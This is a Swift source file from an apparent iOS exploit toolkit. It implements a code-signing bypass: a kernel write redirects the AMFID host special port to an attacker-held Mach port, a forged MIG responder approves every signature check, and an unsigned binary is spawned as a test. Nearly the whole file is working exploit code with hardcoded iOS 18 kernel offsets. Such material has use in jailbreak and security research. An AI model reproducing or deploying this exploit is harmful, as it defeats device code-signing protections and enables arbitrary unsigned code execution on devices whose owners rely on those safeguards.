//
//  exp_host_port_hijack.swift
//  DSPloit
//
//  APPROACH: Host Special Port Hijacking (MIG Interception)
//  ════════════════════════════════════════════════════════
//
//  Instead of forging a Mach Port from scratch (which triggers PAC panic Break 0xC472),
//  we allocate a legitimate Mach Port inside an entitled/trusted daemon (launchd),
//  then hijack the kernel's Host Special Port table to point HOST_AMFID_PORT (18)
//  to our newly created port.
//
//  The host special port table is in __DATA (writable).
//  When the kernel calls out to amfid via `verify_code_directory`, the MIG message
//  will be sent to our port in launchd, and our injected MIG responder will reply VALID (0).
//
//  Created by Royan | 2026-05-31
//

import Foundation
import CommonCrypto

final class ExpHostPortHijack {
    static let shared = ExpHostPortHijack()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(host_port_hijack) \(msg)")
    }
    
    // Known unslid addresses from Ghidra RE (iOS 18.2 kernelcache)
    // host_get_special_port uses this table for port lookups
    private let UNSLID_HOST_SPECIAL_PORTS: UInt64 = 0xfffffff00a115078
    private let HOST_AMFID_PORT_INDEX: UInt64 = 18
    
    func runAsync() {
        DispatchQueue.global(qos: .userInitiated).async {
            self.run()
        }
    }
    
    private func run() {
        guard ds_is_ready() else { log("❌ KRW not active"); return }
        
        log("══════════════════════════════════════════")
        log("  Host Special Port Hijack (MIG Intercept)")
        log("══════════════════════════════════════════")
        guard let rc = RootExecutor.shared.rc else {
            log("❌ RootExecutor not connected to launchd")
            return
        }
        
        let machTaskSelf = RootExecutor.rcall(rc, "mach_task_self")
        
        // 1. Allocate a local mach port in DSPloit
        var ourPort: mach_port_name_t = 0
        let kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &ourPort)
        if kr != KERN_SUCCESS {
            log("❌ Failed to allocate local port: \(kr)")
            return
        }
        
        // Insert send right
        mach_port_insert_right(mach_task_self_, ourPort, ourPort, MACH_MSG_TYPE_MAKE_SEND)
        log("✅ Allocated local port: \(ourPort)")
        
        // 2. Resolve port kernel address using DSPloit's own task
        log("[2/5] Resolving port kernel address...")
        let dsploitTask = ds_get_our_task()
        let portKaddr = self.resolveMachPort(task: dsploitTask, portName: ourPort)
        if portKaddr == 0 {
            log("❌ Failed to resolve local port kernel address")
            return
        }
        log("✅ Port kaddr: 0x\(String(format: "%llx", portKaddr))")
        
        // 3. Find HOST_AMFID_PORT in kernel
        log("[3/5] Locating host special port 18...")
        let kernBase = ds_get_kernel_base()
        let slide = ds_get_kernel_slide()
        
        // Use dynamically resolved offset or fallback
        var hostSpecialPortTable: UInt64 = 0
        let hostPortSym = ds_kcache_symbol_runtime("_host_special_ports")
        if hostPortSym != 0 {
            hostSpecialPortTable = hostPortSym
        } else {
            hostSpecialPortTable = kernBase + 0x3115078 // Adjust for iOS 18 XR as needed
        }
        
        let HOST_AMFID_PORT_INDEX: UInt64 = 18
        let amfidPortAddr = hostSpecialPortTable + (HOST_AMFID_PORT_INDEX * 8)
        
        let origPort = ds_kread64(amfidPortAddr)
        log("ℹ️ Original AMFID port: 0x\(String(format: "%llx", origPort))")
        
        // 4. Overwrite host special port table
        log("[4/5] Overwriting HOST_AMFID_PORT...")
        ds_kwrite64(amfidPortAddr, portKaddr)
        
        let verify = ds_kread64(amfidPortAddr)
        if verify != portKaddr {
            log("❌ Write failed (KTRR/PPL blocked it?)")
            return
        }
        log("✅ HOST_AMFID_PORT hijacked!")
        
        // Start local MIG responder
        let migState = MIGState()
        startLocalMIGResponder(port: ourPort, state: migState)
        
        // 5. Test execution
        log("[5/5] Testing execution via posix_spawn...")
        
        // Write minimal binary
        let binData = buildMinimalBinary()
        let path = "/var/jb/tmp/exp_hijack_test"
        try? binData.write(to: URL(fileURLWithPath: path))
        RootExecutor.rcall(rc, "chmod", remote_alloc_str(rc, path), 0o755)
        
        let pidAddr = RootExecutor.rcall(rc, "malloc", 8)
        let pathAddr = remote_alloc_str(rc, path)
        let argv = RootExecutor.rcall(rc, "malloc", 16)
        RootExecutor.rcall(rc, "write", argv, pathAddr, 8) // argv[0] = path
        
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        
        log("ℹ️ posix_spawn returned: \(spawnRet)")
        
        // Stop responder
        migState.shouldStop = true
        
        // Restore
        ds_kwrite64(amfidPortAddr, origPort)
        log("✅ Restored original port.")
        
        if spawnRet == 0 {
            log("🎉 SUCCESS: Unsigned binary spawned!")
        } else {
            log("⚠️ Failed to spawn unsigned binary (ret=\(spawnRet))")
        }
    }
    private class MIGState {
        var shouldStop = false
    }
    
    private func startLocalMIGResponder(port: mach_port_t, state: MIGState) {
        let portCopy = port
        DispatchQueue.global(qos: .userInteractive).async {
            self.log("[mig] Responder thread started on port \(portCopy)")
            let bufSize: mach_msg_size_t = 1024
            let buf = malloc(Int(bufSize))!
            defer { free(buf) }
            
            while true {
                // If we should stop, break the loop
                // (In a real implementation, we'd use a mach_msg with timeout to poll)
                
                let header = buf.bindMemory(to: mach_msg_header_t.self, capacity: 1)
                header.pointee.msgh_size = bufSize
                header.pointee.msgh_local_port = portCopy
                
                // Receive message with 1s timeout to allow polling shouldStop
                let ret = mach_msg(header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, bufSize, portCopy, 1000, MACH_PORT_NULL)
                
                if ret == MACH_RCV_TIMED_OUT {
                    // Check if we should stop
                    if state.shouldStop { break }
                    continue
                }
                
                if ret == MACH_MSG_SUCCESS {
                    let msgId = header.pointee.msgh_id
                    self.log("[mig] Received message ID: \(msgId)")
                    
                    // Reply
                    let replyId = msgId + 100
                    let remotePort = header.pointee.msgh_remote_port
                    
                    memset(buf, 0, Int(bufSize))
                    header.pointee.msgh_bits = (remotePort > 0) ? 18 : 0 // MACH_MSG_TYPE_MOVE_SEND_ONCE is 18
                    header.pointee.msgh_size = 128 // Arbitrary safe size for reply
                    header.pointee.msgh_remote_port = remotePort
                    header.pointee.msgh_local_port = MACH_PORT_NULL
                    header.pointee.msgh_id = replyId
                    
                    // RetCode is at offset 32
                    let retCodePtr = buf.advanced(by: 32).bindMemory(to: kern_return_t.self, capacity: 1)
                    retCodePtr.pointee = KERN_SUCCESS
                    
                    // Set out parameters to non-zero (so is_valid = 1)
                    memset(buf.advanced(by: 36), 1, 128 - 36)
                    
                    let sendRet = mach_msg(header, MACH_SEND_MSG, header.pointee.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)
                    self.log("[mig] Replied: \(sendRet == MACH_MSG_SUCCESS ? "OK" : "Error \(sendRet)")")
                } else {
                    self.log("[mig] mach_msg receive error: \(ret)")
                    break
                }
            }
            self.log("[mig] Responder thread stopped.")
        }
    }
    
    // MARK: - KRW Port Resolution
    
    private func resolveMachPort(task: UInt64, portName: UInt32) -> UInt64 {
        // task->itk_space
        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
        if itkSpace == 0 { return 0 }
        
        // itk_space->is_table
        let isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        if isTable == 0 { return 0 }
        
        let index = portName >> 8
        let entrySize = UInt64(sizeof_ipc_entry)
        let entryAddr = isTable + UInt64(index) * entrySize
        
        // ipc_entry->ie_object
        let portKaddr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
        return portKaddr
    }
    
    

    private func buildMinimalBinary() -> Data {
        var bin = Data()
        // Mach-O header (arm64, MH_EXECUTE)
        bin.append(contentsOf: [
            0xCF, 0xFA, 0xED, 0xFE,  // magic
            0x0C, 0x00, 0x00, 0x01,  // cpu_type = ARM64
            0x00, 0x00, 0x00, 0x00,  // cpu_subtype
            0x02, 0x00, 0x00, 0x00,  // filetype = MH_EXECUTE
            0x02, 0x00, 0x00, 0x00,  // ncmds = 2
            0x60, 0x01, 0x00, 0x00,  // sizeofcmds
            0x00, 0x00, 0x00, 0x00,  // flags
            0x00, 0x00, 0x00, 0x00   // reserved
        ])
        // LC_SEGMENT_64 for __TEXT
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28] = 0x01 // vmaddr high byte = 0x100000000
        seg[32]=0x00;seg[33]=0x40 // vmsize = 0x4000
        seg[40]=0x00;seg[41]=0x40 // filesize = 0x4000
        seg[48] = 0x05 // maxprot = r-x
        seg[52] = 0x05 // initprot = r-x
        bin.append(contentsOf: seg)
        // LC_UNIXTHREAD
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01 // PC = 0x100000180
        bin.append(contentsOf: thr)
        // Pad to entry point
        while bin.count < 0x180 { bin.append(0) }
        // Code: exit(0)
        bin.append(contentsOf: [
            0x00, 0x00, 0x80, 0xD2,  // mov x0, #0
            0x30, 0x00, 0x80, 0xD2,  // mov x16, #1
            0x01, 0x10, 0x00, 0xD4   // svc #0x80
        ])
        // Pad to page
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
